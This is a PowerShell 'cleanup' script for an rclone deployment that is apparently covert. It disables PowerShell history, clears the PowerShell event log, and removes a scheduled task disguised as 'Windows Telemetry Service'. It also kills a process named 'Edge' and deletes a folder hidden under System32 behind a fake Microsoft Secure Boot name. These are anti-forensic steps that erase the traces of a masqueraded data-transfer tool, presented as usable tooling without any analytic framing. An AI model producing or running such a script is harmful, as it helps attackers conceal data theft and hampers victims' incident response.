#Automated Cleanup script for rclone.
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
$rclonetask = "Windows Telemetry Service"
Stop-ScheduledTask -TaskName $rclonetask -ErrorAction SilentlyContinue
Unregister-ScheduledTask -TaskName $rclonetask -Confirm:$false -ErrorAction SilentlyContinue
Get-Process -Name "Edge" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Remove-Item -Path $basepath -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue